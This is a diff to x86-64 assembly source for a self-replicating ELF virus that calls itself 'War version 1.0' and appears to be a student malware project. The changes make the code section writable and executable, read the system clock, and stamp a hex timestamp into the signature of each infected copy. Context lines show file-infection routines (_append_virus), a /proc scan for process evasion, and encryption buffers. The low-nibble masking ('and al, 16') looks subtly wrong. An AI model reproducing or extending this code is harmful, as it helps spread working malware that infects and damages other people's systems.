@@ -17,9 +17,9 @@
 %define SYS_GETDENTS64		217
 %define SYS_CLOCK_GETTIME	228
 
-%define S_IFDIR 0x4000
-%define O_RDONLY 00
-%define S_IFMT 0xf000
+%define S_IFDIR		0x4000
+%define S_IFMT		0xf000
+%define O_RDONLY	00
 %define SEEK_END	2
 
 %define WAR_STACK_SIZE 5000
@@ -32,6 +32,8 @@
 %define PF_X 1
 %define PF_W 2
 %define PF_R 4
+
+%define CLOCK_REALTIME 0
 
 %define	S_IRUSR 256
 %define S_IWUSR 128
@@ -99,10 +101,11 @@
 
 ; r15 + 1524	; self fd
 ; r15 + 1530	; is_encrypted buffer
-; r15 + 1538	; encryption buffer
+; r15 + 1538	; encryption buffer (1byte)
+; r15 + 1550	; 16 bytes							sys_clock_gettime structure
 global _start
 
-section .text
+section .text write exec
 _start:
 	mov r9, [rsp + 8]							; save program name
 	push rdx
@@ -191,7 +194,6 @@ _evade_specific_process:								; cd to /proc
 		mov rdx, DIRENT_BUFFSIZE
 		mov rax, SYS_GETDENTS64
 		syscall
-
 		cmp rax, 0										; no more files in the directory to read
 		je _close_proc
 
@@ -624,6 +626,12 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 				sub rbp, .delta
 
 		_append_virus:
+			_get_timestamp:
+				lea rsi, [r15 + 1550]
+				mov rdi, CLOCK_REALTIME
+				mov rax, SYS_CLOCK_GETTIME
+				syscall
+
 			xor r8, r8 ; i = 0
 			mov r9, _stop - _start ; virus length
 			mov rdi, [r15 + 1420]  ; fd
@@ -644,7 +652,39 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 					lea rsi, [r15 + 1538]
 
 				.nocypher:
-
+					cmp r8, _timestamp - _start
+					jl .end
+					.build_timestamp:
+						cmp r8, _close_folder - _start - 1
+						jg .end
+						mov r10, r8
+						sub r10, _timestamp - _start
+						shr r10, 1  ;/ 2
+						mov r10b, byte [r15 + 1550 + r10]
+						test r8, 1 ; is_odd
+						jnz .lower_part
+						; if is_even
+						shr r10b, 4 ; / 16
+						jmp .write_letter_to_signature
+						;else
+						.lower_part:
+							mov al, r10b
+							and al, 16
+							mov r10b, al
+						.write_letter_to_signature:
+						cmp r10b, 0x9
+						jg .convert_letters
+						add byte r10b, '0'
+						jmp .end_conversion
+						.convert_letters:
+							sub r10b, 10
+							add byte r10b, 'A'
+						.end_conversion:
+						mov byte [r15 + 1538], r10b
+						lea rsi, [r15 + 1538]
+						
+				.end:
+					
 				mov rax, SYS_WRITE
 				syscall
 				inc r8
@@ -741,9 +781,12 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		mov rax, SYS_SYNC
 		syscall
 
-war:
-	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - ', 49,49,49,49,49,49,49,49,49,49, 0x00
 
+war:
+	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - '
+_timestamp:
+	db 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49, 0x00				; 11111111
+	
 _close_folder:
 	mov rdi, [r15 + 16]
 	mov rax, SYS_CLOSE
